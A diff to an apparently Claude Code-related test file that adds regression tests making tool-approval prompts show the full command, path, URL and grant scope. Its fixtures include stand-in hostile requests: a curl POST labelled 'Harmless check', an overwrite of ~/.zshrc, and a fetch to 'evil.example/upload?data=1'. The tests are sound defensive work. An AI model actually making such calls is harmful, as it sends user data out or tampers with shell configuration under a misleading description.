@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest';
-import { approvalTitle, describeToolRequest, exposedToolName, isInside, mcpContent } from './claude.js';
+import { approvalTitle, describeToolRequest, exposedToolName, isInside, mcpContent, permissionResult } from './claude.js';
 import { brainKeywords, parseGbrainResults } from './gbrain-memory.js';
 import { chooseEngine } from './engine.js';
 import { ToolResult } from './tool-result.js';
@@ -25,8 +25,28 @@ describe('Claude Code engine helpers', () => {
     expect(approvalTitle('Bash', 'Bash')).toBe('Run a shell command');
     expect(approvalTitle('mcp__claude_ai_Slack__slack_send_message')).toBe('Use slack send message (Slack)');
     expect(approvalTitle('Bash', 'Claude wants to run git push')).toBe('Claude wants to run git push');
-    expect(describeToolRequest('Bash', { command: 'git push', description: 'Push the branch' }, 'Not in allow list')).toBe('git push\nPush the branch\nWhy: Not in allow list');
-    expect(describeToolRequest('Write', { file_path: '/Users/me/brain/x.md', content: 'secret' })).toBe('/Users/me/brain/x.md');
+  });
+
+  // Regression: the approval card shows everything an approval grants, not only the stated reason.
+  it.each([
+    ['Bash', { command: `curl -X POST https://example.com/${'x'.repeat(3000)}`, description: 'Harmless check' }, { cwd: '/tmp/task', reason: 'Not in allow list' }, ['/tmp/task', 'Not in allow list']],
+    ['Write', { file_path: '/Users/me/.zshrc', content: 'y'.repeat(5000) }, { blockedPath: '/Users/me/other' }, ['/Users/me/other']],
+    ['WebFetch', { url: 'https://evil.example/upload?data=1', prompt: 'read it' }, {}, []],
+    ['mcp__host_slack__send_message', { channel: 'C123', text: 'hello' }, { mcpServer: { name: 'host_slack', source: 'user' }, description: 'Send a Slack message' }, ['send_message', 'host_slack', 'Send a Slack message']],
+  ] as const)('shows the full scope of a %s approval', (tool, input, context, extra) => {
+    const detail = describeToolRequest(tool, input as Record<string, unknown>, context);
+    expect(detail).toMatch(new RegExp(`^Tool: .*${tool.replace(/^mcp__.+?__/, '')}`, 'm'));
+    // Commands, paths, URLs and connector arguments appear in full, however long.
+    for (const [key, value] of Object.entries(input))
+      if (['command', 'file_path', 'url', 'channel', 'text'].includes(key)) expect(detail).toContain(String(value));
+    for (const value of extra) expect(detail).toContain(value);
+    expect(detail).toMatch(/^Network: \S/m);
+    expect(detail).toMatch(/^Grant: this one call only/m);
+  });
+
+  it('grants only the approved call, never standing permissions', () => {
+    expect(permissionResult(true, { command: 'ls' })).toEqual({ behavior: 'allow', updatedInput: { command: 'ls' } });
+    expect(permissionResult(false, { command: 'ls' }).behavior).toBe('deny');
   });
 
   it('converts tool results to MCP content', () => {
